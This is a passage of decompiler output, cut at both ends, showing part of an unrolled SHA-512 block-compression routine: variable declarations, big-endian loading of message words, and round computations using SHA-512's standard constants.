  unsigned __int64 v138; // [esp+DCh] [ebp-4Ch]
  unsigned __int64 v139; // [esp+DCh] [ebp-4Ch]
  int v140; // [esp+E0h] [ebp-48h]
  unsigned int v141; // [esp+E0h] [ebp-48h]
  unsigned int v142; // [esp+E0h] [ebp-48h]
  unsigned int v143; // [esp+E4h] [ebp-44h]
  unsigned int v144; // [esp+E4h] [ebp-44h]
  unsigned int v145; // [esp+E4h] [ebp-44h]
  unsigned int v146; // [esp+E4h] [ebp-44h]
  unsigned int v147; // [esp+E8h] [ebp-40h]
  int v148; // [esp+E8h] [ebp-40h]
  int v149; // [esp+E8h] [ebp-40h]
  unsigned int v150; // [esp+E8h] [ebp-40h]
  int v151; // [esp+E8h] [ebp-40h]
  unsigned int v152; // [esp+E8h] [ebp-40h]
  unsigned int v153; // [esp+ECh] [ebp-3Ch]
  unsigned int v154; // [esp+ECh] [ebp-3Ch]
  unsigned int v155; // [esp+ECh] [ebp-3Ch]
  unsigned int v156; // [esp+ECh] [ebp-3Ch]
  unsigned int v157; // [esp+ECh] [ebp-3Ch]
  unsigned int v158; // [esp+F0h] [ebp-38h]
  unsigned int v159; // [esp+F0h] [ebp-38h]
  unsigned int v160; // [esp+F0h] [ebp-38h]
  unsigned int v161; // [esp+F0h] [ebp-38h]
  unsigned int v162; // [esp+F0h] [ebp-38h]
  unsigned int v163; // [esp+F4h] [ebp-34h]
  unsigned int v164; // [esp+F4h] [ebp-34h]
  int v165; // [esp+F4h] [ebp-34h]
  unsigned int v166; // [esp+F4h] [ebp-34h]
  unsigned int v167; // [esp+F4h] [ebp-34h]
  unsigned int v168; // [esp+F8h] [ebp-30h]
  unsigned int v169; // [esp+F8h] [ebp-30h]
  unsigned int v170; // [esp+F8h] [ebp-30h]
  unsigned int v171; // [esp+F8h] [ebp-30h]
  unsigned int v172; // [esp+FCh] [ebp-2Ch]
  unsigned int v173; // [esp+FCh] [ebp-2Ch]
  unsigned int v174; // [esp+FCh] [ebp-2Ch]
  unsigned int v175; // [esp+FCh] [ebp-2Ch]
  unsigned int v176; // [esp+FCh] [ebp-2Ch]
  __int64 v177; // [esp+100h] [ebp-28h]
  unsigned __int64 v178; // [esp+100h] [ebp-28h]
  unsigned __int64 v179; // [esp+100h] [ebp-28h]
  unsigned int v180; // [esp+100h] [ebp-28h]
  unsigned int v181; // [esp+100h] [ebp-28h]
  __int64 v182; // [esp+104h] [ebp-24h]
  __int64 v183; // [esp+104h] [ebp-24h]
  unsigned int v184; // [esp+108h] [ebp-20h]
  unsigned int v185; // [esp+108h] [ebp-20h]
  int v186; // [esp+10Ch] [ebp-1Ch]
  unsigned int v187; // [esp+10Ch] [ebp-1Ch]
  unsigned int v188; // [esp+10Ch] [ebp-1Ch]
  unsigned int v189; // [esp+10Ch] [ebp-1Ch]
  unsigned int v190; // [esp+10Ch] [ebp-1Ch]
  unsigned int v191; // [esp+10Ch] [ebp-1Ch]
  unsigned int v192; // [esp+10Ch] [ebp-1Ch]
  unsigned __int64 v193; // [esp+110h] [ebp-18h]
  unsigned __int64 v194; // [esp+110h] [ebp-18h]
  unsigned int v195; // [esp+110h] [ebp-18h]
  unsigned int v196; // [esp+110h] [ebp-18h]
  unsigned int v197; // [esp+110h] [ebp-18h]
  unsigned int v198; // [esp+110h] [ebp-18h]
  unsigned int v199; // [esp+114h] [ebp-14h]
  unsigned int v200; // [esp+114h] [ebp-14h]
  unsigned int v201; // [esp+114h] [ebp-14h]
  unsigned int v202; // [esp+114h] [ebp-14h]
  unsigned int v203; // [esp+118h] [ebp-10h]
  unsigned int v204; // [esp+118h] [ebp-10h]
  unsigned int v205; // [esp+118h] [ebp-10h]
  unsigned int v206; // [esp+118h] [ebp-10h]
  unsigned int v207; // [esp+118h] [ebp-10h]
  unsigned int v208; // [esp+11Ch] [ebp-Ch]
  unsigned int v209; // [esp+11Ch] [ebp-Ch]
  unsigned int v210; // [esp+11Ch] [ebp-Ch]
  unsigned int v211; // [esp+11Ch] [ebp-Ch]
  unsigned int v212; // [esp+11Ch] [ebp-Ch]
  unsigned int v213; // [esp+11Ch] [ebp-Ch]
  unsigned int v214; // [esp+11Ch] [ebp-Ch]
  unsigned int v215; // [esp+120h] [ebp-8h]
  unsigned int v216; // [esp+120h] [ebp-8h]
  unsigned int v217; // [esp+120h] [ebp-8h]
  unsigned int v218; // [esp+120h] [ebp-8h]
  unsigned int v219; // [esp+124h] [ebp-4h]
  int v220; // [esp+124h] [ebp-4h]
  unsigned int v221; // [esp+134h] [ebp+Ch]
  unsigned int v222; // [esp+134h] [ebp+Ch]
  unsigned int v223; // [esp+134h] [ebp+Ch]
  unsigned int v224; // [esp+134h] [ebp+Ch]

  v2 = a1[1];
  v103 = *a1;
  v102 = a1[2];
  v100 = a1[4];
  v110 = *((_QWORD *)a1 + 4);
  v109 = a1[10];
  v108 = a1[11];
  v107 = a1[12];
  v106 = a1[13];
  v101 = a1[3];
  v99 = a1[5];
  HIDWORD(v3) = (unsigned __int64)*a2 >> 24;
  LODWORD(v3) = a2[1] | (*a2 << 8);
  HIDWORD(v3) = v3 >> 24;
  LODWORD(v3) = a2[2] | ((_DWORD)v3 << 8);
  HIDWORD(v3) = v3 >> 24;
  LODWORD(v3) = a2[3] | ((_DWORD)v3 << 8);
  HIDWORD(v3) = v3 >> 24;
  LODWORD(v3) = a2[4] | ((_DWORD)v3 << 8);
  HIDWORD(v3) = v3 >> 24;
  LODWORD(v3) = a2[5] | ((_DWORD)v3 << 8);
  HIDWORD(v3) = v3 >> 24;
  LODWORD(v3) = a2[6] | ((_DWORD)v3 << 8);
  HIDWORD(v115) = a2[7] | ((_DWORD)v3 << 8);
  v105 = a1[14];
  v104 = a1[15];
  LODWORD(v115) = v3 >> 24;
  v98 = a1[6];
  v4 = HIDWORD(v115)
     + v105
     + (v110 & v109 ^ v107 & ~(_DWORD)v110)
     + ((v110 >> 14) ^ (v110 >> 18) ^ (((_DWORD)v110 << 23) | (HIDWORD(v110) >> 9)))
     - 685199838;
  v5 = ((((v3 << 8) | a2[7])
       + __PAIR64__(v104, v105)
       + __PAIR64__(
           ((HIDWORD(v110) >> 14) | ((_DWORD)v110 << 18)) ^ ((HIDWORD(v110) >> 18) | ((_DWORD)v110 << 14)) ^ (v110 >> 9),
           v110 & v109 ^ v107 & ~(_DWORD)v110)
       + __PAIR64__(
           HIDWORD(v110) & v108 ^ v106 & ~HIDWORD(v110),
           (v110 >> 14) ^ (v110 >> 18) ^ (((_DWORD)v110 << 23) | (HIDWORD(v110) >> 9)))
       + 3609767458u) >> 32)
     + 1116352408;
  v97 = a1[7];
  v128 = __PAIR64__(v5, v4) + *((_QWORD *)a1 + 3);
  v6 = __PAIR64__(v5, v4)
     + __PAIR64__(
         (*(_QWORD *)a1 >> 7) ^ (*(_QWORD *)a1 >> 2) ^ (__SPAIR64__(*a1, v2) >> 28),
         v103 & v102 ^ v100 & (v103 ^ v102))
     + __PAIR64__(
         v2 & v101 ^ v99 & (v2 ^ v101),
         (__SPAIR64__(v103, v2) >> 7) ^ (__SPAIR64__(v103, v2) >> 2) ^ (__PAIR64__(v2, v103) >> 28));
  v158 = HIDWORD(v6);
  v208 = v6;
  LODWORD(v117) = (((((((((((((unsigned __int64)a2[8] << 8) | a2[9]) << 8) | a2[10]) << 8) | a2[11]) << 8) | a2[12]) << 8) | a2[13]) << 8) | a2[14]) >> 24;
  HIDWORD(v117) = a2[15] | ((a2[14] | ((a2[13] | ((a2[12] | ((a2[11] | ((a2[10] | ((a2[9] | (a2[8] << 8)) << 8)) << 8)) << 8)) << 8)) << 8)) << 8);
  v7 = (((((((((((((((unsigned __int64)a2[8] << 8) | a2[9]) << 8) | a2[10]) << 8) | a2[11]) << 8) | a2[12]) << 8) | a2[13]) << 8) | a2[14]) << 8) | a2[15])
     + __PAIR64__(v106, v107)
     + __PAIR64__(
         ((HIDWORD(v128) >> 14) | ((_DWORD)v128 << 18)) ^ ((HIDWORD(v128) >> 18) | ((_DWORD)v128 << 14)) ^ (v128 >> 9),
         v128 & v110 ^ v109 & ~(_DWORD)v128)
     + __PAIR64__(
         HIDWORD(v128) & HIDWORD(v110) ^ v108 & ~HIDWORD(v128),
         (v128 >> 14) ^ (v128 >> 18) ^ (((_DWORD)v128 << 23) | (HIDWORD(v128) >> 9)))
     + 0x7137449123EF65CDi64;
  v215 = (v7 + __PAIR64__(v99, v100)) >> 32;
  v130 = v7 + v100;
  v193 = v7
       + __PAIR64__(
           (__PAIR64__(v158, v208) >> 7) ^ (__PAIR64__(v158, v208) >> 2) ^ ((v158 >> 28) | (16 * v208)),
           v103 & v102 ^ v208 & (v103 ^ v102))
       + __PAIR64__(
           v2 & v101 ^ v158 & (v2 ^ v101),
           ((v208 << 25) | (v158 >> 7)) ^ ((v208 << 30) | (v158 >> 2)) ^ (__PAIR64__(v158, v208) >> 28));
  v116 = a2[23] | ((a2[22] | ((a2[21] | ((a2[20] | ((a2[19] | ((a2[18] | ((a2[17] | (a2[16] << 8)) << 8)) << 8)) << 8)) << 8)) << 8)) << 8);
  v114 = (((((((((((((unsigned __int64)a2[16] << 8) | a2[17]) << 8) | a2[18]) << 8) | a2[19]) << 8) | a2[20]) << 8) | a2[21]) << 8) | a2[22]) >> 24;
  v8 = __PAIR64__(v108, v109)
     + (((((((((((((((unsigned __int64)a2[16] << 8) | a2[17]) << 8) | a2[18]) << 8) | a2[19]) << 8) | a2[20]) << 8) | a2[21]) << 8) | a2[22]) << 8) | a2[23])
     + __PAIR64__(
         ((v215 >> 14) | (v130 << 18)) ^ ((v215 >> 18) | (v130 << 14)) ^ ((v7 + __PAIR64__(v99, v100)) >> 9),
         v130 & v128 ^ a1[8] & ~v130)
     + __PAIR64__(
         v215 & HIDWORD(v128) ^ a1[9] & ~v215,
         ((v7 + __PAIR64__(v99, v100)) >> 14) ^ ((v7 + __PAIR64__(v99, v100)) >> 18) ^ ((v130 << 23) | (v215 >> 9)))
     - 0x4A3F043013B2C4D1i64;
  v147 = (v8 + __PAIR64__(v101, v102)) >> 32;
  v132 = v8 + v102;
  v186 = (((_DWORD)v193 << 25) | (HIDWORD(v193) >> 7)) ^ (((_DWORD)v193 << 30) | (HIDWORD(v193) >> 2)) ^ (v193 >> 28);
  v10 = v8
      + __PAIR64__(
          (v2 & HIDWORD(v193) ^ v158 & (v2 ^ HIDWORD(v193)))
        + __CFADD__(v103 & v193 ^ v208 & (v103 ^ v193), v186)
        + ((v193 >> 7) ^ (v193 >> 2) ^ ((HIDWORD(v193) >> 28) | (16 * v193))),
          (v103 & v193 ^ v208 & (v103 ^ v193)) + v186);
  v9 = HIDWORD(v10);
  v187 = v10;
  v168 = v9;
  HIDWORD(v3) = (unsigned __int64)a2[24] >> 24;
  LODWORD(v3) = a2[25] | (a2[24] << 8);
  HIDWORD(v3) = v3 >> 24;
  LODWORD(v3) = a2[26] | ((_DWORD)v3 << 8);
  HIDWORD(v3) = v3 >> 24;
  LODWORD(v3) = a2[27] | ((_DWORD)v3 << 8);
  HIDWORD(v3) = v3 >> 24;
  LODWORD(v3) = a2[28] | ((_DWORD)v3 << 8);
  HIDWORD(v3) = v3 >> 24;
  LODWORD(v3) = a2[29] | ((_DWORD)v3 << 8);
  HIDWORD(v3) = v3 >> 24;
  LODWORD(v3) = a2[30] | ((_DWORD)v3 << 8);
  LODWORD(v113) = v3 >> 24;
  HIDWORD(v113) = a2[31] | ((_DWORD)v3 << 8);
  v11 = v110
      + ((v3 << 8) | a2[31])
      + __PAIR64__(
          ((v147 >> 14) | (v132 << 18)) ^ ((v147 >> 18) | (v132 << 14)) ^ ((v8 + __PAIR64__(v101, v102)) >> 9),
          v132 & (v7 + v100) ^ v128 & ~v132)
      + __PAIR64__(
          v147 & v215 ^ HIDWORD(v128) & ~v147,
          ((v8 + __PAIR64__(v101, v102)) >> 14) ^ ((v8 + __PAIR64__(v101, v102)) >> 18) ^ ((v132 << 23) | (v147 >> 9)))
      - 0x164A245A7E762444i64;
  v12 = v11 + *(_QWORD *)a1;
  v153 = v11 + *a1;
  HIDWORD(v177) = (__PAIR64__(v9, v187) >> 7) ^ (__PAIR64__(v9, v187) >> 2) ^ ((v9 >> 28) | (16 * v187));
  LODWORD(v177) = ((v187 << 25) | (v9 >> 7)) ^ ((v187 << 30) | (v9 >> 2)) ^ (__PAIR64__(v9, v187) >> 28);
  v14 = v11 + __PAIR64__(v9 & HIDWORD(v193) ^ v158 & (v9 ^ HIDWORD(v193)), v187 & v193 ^ v208 & (v187 ^ v193)) + v177;
  v13 = HIDWORD(v14);
  v178 = v14;
  HIDWORD(v3) = (unsigned __int64)a2[32] >> 24;
  LODWORD(v3) = a2[33] | (a2[32] << 8);
  HIDWORD(v3) = v3 >> 24;
  LODWORD(v3) = a2[34] | ((_DWORD)v3 << 8);
  HIDWORD(v3) = v3 >> 24;
  LODWORD(v3) = a2[35] | ((_DWORD)v3 << 8);
  HIDWORD(v3) = v3 >> 24;
  LODWORD(v3) = a2[36] | ((_DWORD)v3 << 8);
  HIDWORD(v3) = v3 >> 24;
  LODWORD(v3) = a2[37] | ((_DWORD)v3 << 8);
  HIDWORD(v3) = v3 >> 24;
  LODWORD(v3) = a2[38] | ((_DWORD)v3 << 8);
  LODWORD(v111) = v3 >> 24;
  HIDWORD(v111) = a2[39] | ((_DWORD)v3 << 8);
  v15 = v128
      + ((v3 << 8) | a2[39])
      + __PAIR64__(
          ((HIDWORD(v12) >> 14) | ((_DWORD)v12 << 18)) ^ ((HIDWORD(v12) >> 18) | ((_DWORD)v12 << 14)) ^ (v12 >> 9),
          v12 & (v8 + v102) ^ (v7 + v100) & ~(_DWORD)v12)
      + __PAIR64__(
          HIDWORD(v12) & v147 ^ v215 & ~HIDWORD(v12),
          (v12 >> 14) ^ (v12 >> 18) ^ (((_DWORD)v12 << 23) | (HIDWORD(v12) >> 9)))
      + 0x3956C25BF348B538i64;
  v159 = (v15 + __PAIR64__(v158, v208)) >> 32;
  v209 = v128
       + HIDWORD(v111)
       + (v12 & (v8 + v102) ^ (v7 + v100) & ~(_DWORD)v12)
       + ((v12 >> 14) ^ (v12 >> 18) ^ (((_DWORD)v12 << 23) | (HIDWORD(v12) >> 9)))
       - 213338824
       + v208;
  v140 = (((_DWORD)v178 << 25) | (v13 >> 7)) ^ (((_DWORD)v178 << 30) | (v13 >> 2)) ^ (__PAIR64__(v13, v178) >> 28);
  v17 = v15
      + __PAIR64__(
          (v13 & v168 ^ HIDWORD(v193) & (v13 ^ v168))
        + __CFADD__(v178 & v187 ^ v193 & (v178 ^ v187), v140)
        + ((__PAIR64__(v13, v178) >> 7) ^ (__PAIR64__(v13, v178) >> 2) ^ ((v13 >> 28) | (16 * v178))),
          (v178 & v187 ^ v193 & (v178 ^ v187)) + v140);
  v16 = HIDWORD(v17);
  v141 = v17;
  v184 = v16;
  HIDWORD(v3) = (unsigned __int64)a2[40] >> 24;
  LODWORD(v3) = a2[41] | (a2[40] << 8);
  HIDWORD(v3) = v3 >> 24;
  LODWORD(v3) = a2[42] | ((_DWORD)v3 << 8);
  HIDWORD(v3) = v3 >> 24;
  LODWORD(v3) = a2[43] | ((_DWORD)v3 << 8);
  HIDWORD(v3) = v3 >> 24;
  LODWORD(v3) = a2[44] | ((_DWORD)v3 << 8);
  HIDWORD(v3) = v3 >> 24;
  LODWORD(v3) = a2[45] | ((_DWORD)v3 << 8);
  HIDWORD(v3) = v3 >> 24;
  LODWORD(v3) = a2[46] | ((_DWORD)v3 << 8);
  LODWORD(v124) = v3 >> 24;
  HIDWORD(v124) = a2[47] | ((_DWORD)v3 << 8);
  v18 = v7
      + __PAIR64__(v99, v100)
      + ((v3 << 8) | a2[47])
      + __PAIR64__(
          ((v159 >> 14) | (v209 << 18)) ^ ((v159 >> 18) | (v209 << 14)) ^ (__PAIR64__(v159, v209) >> 9),
          v153 & v209 ^ (v8 + v102) & ~v209)
      + __PAIR64__(
          HIDWORD(v12) & v159 ^ v147 & ~v159,
          (__PAIR64__(v159, v209) >> 14) ^ (__PAIR64__(v159, v209) >> 18) ^ ((v209 << 23) | (v159 >> 9)))
      + 0x59F111F1B605D019i64;
  v194 = v18 + v193;
  HIDWORD(v19) = v16 & HIDWORD(v14) ^ v168 & (v16 ^ HIDWORD(v14));
  LODWORD(v19) = ((v141 << 25) | (v16 >> 7)) ^ ((v141 << 30) | (v16 >> 2)) ^ (__PAIR64__(v16, v141) >> 28);
  v21 = v18
      + __PAIR64__(
          (__PAIR64__(v16, v141) >> 7) ^ (__PAIR64__(v16, v141) >> 2) ^ ((v16 >> 28) | (16 * v141)),
          v141 & v178 ^ v187 & (v141 ^ v178))
      + v19;
  v20 = HIDWORD(v21);
  LODWORD(v19) = v21;
  v136 = v21;
  HIDWORD(v3) = (unsigned __int64)a2[48] >> 24;
  LODWORD(v3) = a2[49] | (a2[48] << 8);
  HIDWORD(v3) = v3 >> 24;
  LODWORD(v3) = a2[50] | ((_DWORD)v3 << 8);
  HIDWORD(v3) = v3 >> 24;
  LODWORD(v3) = a2[51] | ((_DWORD)v3 << 8);
  HIDWORD(v3) = v3 >> 24;
  LODWORD(v3) = a2[52] | ((_DWORD)v3 << 8);
  HIDWORD(v3) = v3 >> 24;
  LODWORD(v3) = a2[53] | ((_DWORD)v3 << 8);
  HIDWORD(v3) = v3 >> 24;
  LODWORD(v3) = a2[54] | ((_DWORD)v3 << 8);
  LODWORD(v121) = v3 >> 24;
  HIDWORD(v121) = a2[55] | ((_DWORD)v3 << 8);
  v22 = v8
      + __PAIR64__(v101, v102)
      + ((v3 << 8) | a2[55])
      + __PAIR64__(
          ((HIDWORD(v194) >> 14) | ((_DWORD)v194 << 18)) ^ ((HIDWORD(v194) >> 18) | ((_DWORD)v194 << 14)) ^ (v194 >> 9),
          v194 & v209 ^ v153 & ~(_DWORD)v194)
      + __PAIR64__(
          HIDWORD(v194) & v159 ^ HIDWORD(v12) & ~HIDWORD(v194),
          (v194 >> 14) ^ (v194 >> 18) ^ (((_DWORD)v194 << 23) | (HIDWORD(v194) >> 9)))
      - 0x6DC07D5B50E6B065i64;
  v169 = (v22 + __PAIR64__(v168, v187)) >> 32;
  v188 = v22 + v187;
  v148 = (__PAIR64__(v20, v19) >> 2) ^ ((v20 >> 28) | (16 * v19));
  HIDWORD(v19) = v20 & v184 ^ HIDWORD(v14) & (v20 ^ v184);
  LODWORD(v19) = (((_DWORD)v21 << 25) | (v20 >> 7)) ^ (((_DWORD)v19 << 30) | (v20 >> 2)) ^ (__PAIR64__(v20, v19) >> 28);
  v24 = v22 + __PAIR64__((unsigned int)(v21 >> 7) ^ v148, v136 & v141 ^ v14 & (v136 ^ v141)) + v19;
  v23 = HIDWORD(v24);
  v149 = HIDWORD(v24);
  v216 = v24;
  HIDWORD(v3) = (unsigned __int64)a2[56] >> 24;
  LODWORD(v3) = a2[57] | (a2[56] << 8);
  HIDWORD(v3) = v3 >> 24;
  LODWORD(v3) = a2[58] | ((_DWORD)v3 << 8);
  HIDWORD(v3) = v3 >> 24;
  LODWORD(v3) = a2[59] | ((a2[58] | ((a2[57] | (a2[56] << 8)) << 8)) << 8);
  HIDWORD(v3) = v3 >> 24;
  LODWORD(v3) = a2[60] | ((_DWORD)v3 << 8);
  HIDWORD(v3) = v3 >> 24;
  LODWORD(v3) = a2[61] | ((a2[60] | ((a2[59] | ((a2[58] | ((a2[57] | (a2[56] << 8)) << 8)) << 8)) << 8)) << 8);
  HIDWORD(v3) = v3 >> 24;
  LODWORD(v3) = a2[62] | ((_DWORD)v3 << 8);
  LODWORD(v119) = v3 >> 24;
  HIDWORD(v119) = a2[63] | ((a2[62] | ((a2[61] | ((a2[60] | ((a2[59] | ((a2[58] | ((a2[57] | (a2[56] << 8)) << 8)) << 8)) << 8)) << 8)) << 8)) << 8);
  v25 = ((v3 << 8) | a2[63])
      + __PAIR64__(HIDWORD(v12), v153)
      + __PAIR64__(
          ((v169 >> 14) | (v188 << 18)) ^ ((v169 >> 18) | (v188 << 14)) ^ (__PAIR64__(v169, v188) >> 9),
          v188 & v194 ^ v209 & ~v188)
      + __PAIR64__(
          v169 & HIDWORD(v194) ^ v159 & ~v169,
          (__PAIR64__(v169, v188) >> 14) ^ (__PAIR64__(v169, v188) >> 18) ^ ((v188 << 23) | (v169 >> 9)))
      - 0x54E3A12A25927EE8i64;
  v179 = v25 + v14;
  HIDWORD(v19) = HIDWORD(v24) & HIDWORD(v21) ^ v184 & (HIDWORD(v24) ^ HIDWORD(v21));
  LODWORD(v19) = ((v216 << 25) | (v23 >> 7)) ^ ((v216 << 30) | (v23 >> 2)) ^ (__PAIR64__(v23, v216) >> 28);
  v26 = v25
      + __PAIR64__(
          (__PAIR64__(v23, v216) >> 7) ^ (__PAIR64__(v23, v216) >> 2) ^ ((v23 >> 28) | (16 * v216)),
          v216 & v136 ^ v141 & (v216 ^ v136))
      + v19;
  HIDWORD(v3) = (unsigned __int64)a2[64] >> 24;
  LODWORD(v3) = a2[65] | (a2[64] << 8);
  HIDWORD(v3) = v3 >> 24;
  LODWORD(v3) = a2[66] | ((_DWORD)v3 << 8);
  HIDWORD(v3) = v3 >> 24;
  LODWORD(v3) = a2[67] | ((_DWORD)v3 << 8);
  HIDWORD(v3) = v3 >> 24;
  LODWORD(v3) = a2[68] | ((_DWORD)v3 << 8);
  HIDWORD(v3) = v3 >> 24;
  LODWORD(v3) = a2[69] | ((_DWORD)v3 << 8);
  HIDWORD(v3) = v3 >> 24;
  LODWORD(v3) = a2[70] | ((_DWORD)v3 << 8);
  HIDWORD(v129) = v3 >> 24;
  LODWORD(v129) = a2[71] | ((_DWORD)v3 << 8);
  v27 = ((v3 << 8) | a2[71])
      + __PAIR64__(v159, v209)
      + __PAIR64__(
          ((HIDWORD(v179) >> 14) | ((_DWORD)v179 << 18)) ^ ((HIDWORD(v179) >> 18) | ((_DWORD)v179 << 14)) ^ (v179 >> 9),
          v179 & v188 ^ v194 & ~(_DWORD)v179)
      + __PAIR64__(
          HIDWORD(v179) & v169 ^ HIDWORD(v194) & ~HIDWORD(v179),
          (v179 >> 14) ^ (v179 >> 18) ^ (((_DWORD)v179 << 23) | (HIDWORD(v179) >> 9)))
      - 0x27F855675CFCFDBEi64;
  v185 = (v27 + __PAIR64__(v184, v141)) >> 32;
  v142 = v27 + v141;
  v143 = (((_DWORD)v26 << 25) | (HIDWORD(v26) >> 7)) ^ (((_DWORD)v26 << 30) | (HIDWORD(v26) >> 2)) ^ (v26 >> 28);
  v28 = v26 & v216 ^ v21 & (v26 ^ v216);
  v29 = __PAIR64__((v26 >> 7) ^ (v26 >> 2) ^ ((HIDWORD(v26) >> 28) | (16 * v26)), v28)
      + __PAIR64__(HIDWORD(v26) & HIDWORD(v24) ^ HIDWORD(v21) & (unsigned int)(HIDWORD(v26) ^ HIDWORD(v24)), v143);
  v144 = v27 + v28 + v143;
  v160 = (v27 + v29) >> 32;
  v112 = (((((((((((((unsigned __int64)a2[72] << 8) | a2[73]) << 8) | a2[74]) << 8) | a2[75]) << 8) | a2[76]) << 8) | a2[77]) << 8) | a2[78]) >> 24;
  v123 = a2[79] | ((a2[78] | ((a2[77] | ((a2[76] | ((a2[75] | ((a2[74] | ((a2[73] | (a2[72] << 8)) << 8)) << 8)) << 8)) << 8)) << 8)) << 8);
  v30 = (((((((((((((((unsigned __int64)a2[72] << 8) | a2[73]) << 8) | a2[74]) << 8) | a2[75]) << 8) | a2[76]) << 8) | a2[77]) << 8) | a2[78]) << 8) | a2[79])
      + v194
      + __PAIR64__(v185 & HIDWORD(v179) ^ v169 & ~v185, v142 & v179 ^ v188 & ~v142)
      + __PAIR64__(
          ((v185 >> 14) | (v142 << 18)) ^ ((v185 >> 18) | (v142 << 14)) ^ (__PAIR64__(v185, v142) >> 9),
          (__PAIR64__(v185, v142) >> 14) ^ (__PAIR64__(v185, v142) >> 18) ^ ((v142 << 23) | (v185 >> 9)))
      + 0x12835B0145706FBEi64;
  v203 = (v30 + v21) >> 32;
  v137 = v30 + v21;
  v133 = v30
       + __PAIR64__(
           (__PAIR64__(v160, v144) >> 7) ^ (__PAIR64__(v160, v144) >> 2) ^ ((v160 >> 28) | (16 * v144)),
           v26 & v24 ^ v144 & (v26 ^ v24))
       + __PAIR64__(
           HIDWORD(v26) & HIDWORD(v24) ^ v160 & (HIDWORD(v26) ^ HIDWORD(v24)),
           ((v144 << 25) | (v160 >> 7)) ^ ((v144 << 30) | (v160 >> 2)) ^ (__PAIR64__(v160, v144) >> 28));
  LODWORD(v125) = (((((((((((((unsigned __int64)a2[80] << 8) | a2[81]) << 8) | a2[82]) << 8) | a2[83]) << 8) | a2[84]) << 8) | a2[85]) << 8) | a2[86]) >> 24;
  HIDWORD(v125) = a2[87] | ((a2[86] | ((a2[85] | ((a2[84] | ((a2[83] | ((a2[82] | ((a2[81] | (a2[80] << 8)) << 8)) << 8)) << 8)) << 8)) << 8)) << 8);
  v31 = (((((((((((((((unsigned __int64)a2[80] << 8) | a2[81]) << 8) | a2[82]) << 8) | a2[83]) << 8) | a2[84]) << 8) | a2[85]) << 8) | a2[86]) << 8) | a2[87])
      + __PAIR64__(v169, v188)
      + __PAIR64__(v203 & v185 ^ HIDWORD(v179) & ~v203, v137 & v142 ^ v179 & ~v137)
      + __PAIR64__(
          ((v203 >> 14) | (v137 << 18)) ^ ((v203 >> 18) | (v137 << 14)) ^ ((v30 + v21) >> 9),
          ((v30 + v21) >> 14) ^ ((v30 + v21) >> 18) ^ ((v137 << 23) | (v203 >> 9)))
      + 0x243185BE4EE4B28Ci64;
  v150 = (v31 + v24) >> 32;
  v217 = HIDWORD(v125)
       + v188
       + (v137 & v142 ^ (v25 + v14) & ~v137)
       + (((v30 + v21) >> 14) ^ ((v30 + v21) >> 18) ^ ((v137 << 23) | (v203 >> 9)))
       + 1323610764
       + v24;
  v32 = v31
      + __PAIR64__(
          HIDWORD(v26) & HIDWORD(v133) ^ v160 & (HIDWORD(v26) ^ HIDWORD(v133)),
          v26 & v133 ^ v144 & (v26 ^ v133))
      + __PAIR64__(
          (v133 >> 7) ^ (v133 >> 2) ^ ((HIDWORD(v133) >> 28) | (16 * v133)),
          (((_DWORD)v133 << 25) | (HIDWORD(v133) >> 7)) ^ (((_DWORD)v133 << 30) | (HIDWORD(v133) >> 2)) ^ (v133 >> 28));
  v172 = HIDWORD(v32);
  v163 = v32;
  HIDWORD(v3) = (unsigned __int64)a2[88] >> 24;
  LODWORD(v3) = a2[89] | (a2[88] << 8);
  HIDWORD(v3) = v3 >> 24;
  LODWORD(v3) = a2[90] | ((_DWORD)v3 << 8);
  HIDWORD(v3) = v3 >> 24;
  LODWORD(v3) = a2[91] | ((_DWORD)v3 << 8);
  HIDWORD(v3) = v3 >> 24;
  LODWORD(v3) = a2[92] | ((_DWORD)v3 << 8);
  HIDWORD(v3) = v3 >> 24;
  LODWORD(v3) = a2[93] | ((_DWORD)v3 << 8);
  HIDWORD(v3) = v3 >> 24;
  LODWORD(v3) = a2[94] | ((_DWORD)v3 << 8);
  v122 = v3 >> 24;
  v118 = a2[95] | ((_DWORD)v3 << 8);
  v33 = v25
      + v14
      + ((v3 << 8) | a2[95])
      + __PAIR64__(v150 & v203 ^ v185 & ~v150, v217 & (v30 + v21) ^ v142 & ~v217)
      + __PAIR64__(
          ((v150 >> 14) | (v217 << 18)) ^ ((v150 >> 18) | (v217 << 14)) ^ (__PAIR64__(v150, v217) >> 9),
          (__PAIR64__(v150, v217) >> 14) ^ (__PAIR64__(v150, v217) >> 18) ^ ((v217 << 23) | (v150 >> 9)))
      + 0x550C7DC3D5FFB4E2i64;
  v154 = (v33 + v26) >> 32;
  v219 = v25
       + v14
       + v118
       + (v217 & (v30 + v21) ^ v142 & ~v217)
       + ((__PAIR64__(v150, v217) >> 14) ^ (__PAIR64__(v150, v217) >> 18) ^ ((v217 << 23) | (v150 >> 9)))
       - 704662302
       + v26;
  v34 = v33
      + __PAIR64__(v172 & HIDWORD(v133) ^ v160 & (v172 ^ HIDWORD(v133)), v163 & v133 ^ v144 & (v163 ^ v133))
      + __PAIR64__(
          (__PAIR64__(v172, v163) >> 7) ^ (__PAIR64__(v172, v163) >> 2) ^ ((v172 >> 28) | (16 * v163)),
          ((v163 << 25) | (v172 >> 7)) ^ ((v163 << 30) | (v172 >> 2)) ^ (__PAIR64__(v172, v163) >> 28));
  v210 = HIDWORD(v34);
  LODWORD(v194) = v34;
  HIDWORD(v3) = (unsigned __int64)a2[96] >> 24;
  LODWORD(v3) = a2[97] | (a2[96] << 8);
  HIDWORD(v3) = v3 >> 24;
  LODWORD(v3) = a2[98] | ((_DWORD)v3 << 8);
  HIDWORD(v3) = v3 >> 24;
  LODWORD(v3) = a2[99] | ((_DWORD)v3 << 8);
  HIDWORD(v3) = v3 >> 24;
  LODWORD(v3) = a2[100] | ((_DWORD)v3 << 8);
  HIDWORD(v3) = v3 >> 24;
  LODWORD(v3) = a2[101] | ((_DWORD)v3 << 8);
  HIDWORD(v3) = v3 >> 24;
  LODWORD(v3) = a2[102] | ((_DWORD)v3 << 8);
  LODWORD(v120) = v3 >> 24;
  HIDWORD(v120) = a2[103] | ((_DWORD)v3 << 8);
  v35 = __PAIR64__(v185, v142)
      + ((v3 << 8) | a2[103])
      + __PAIR64__(v154 & v150 ^ v203 & ~v154, v219 & v217 ^ (v30 + v21) & ~v219)
      + __PAIR64__(
          ((v154 >> 14) | (v219 << 18)) ^ ((v154 >> 18) | (v219 << 14)) ^ (__PAIR64__(v154, v219) >> 9),
          (__PAIR64__(v154, v219) >> 14) ^ (__PAIR64__(v154, v219) >> 18) ^ ((v219 << 23) | (v154 >> 9)))
      + 0x72BE5D74F27B896Fi64;
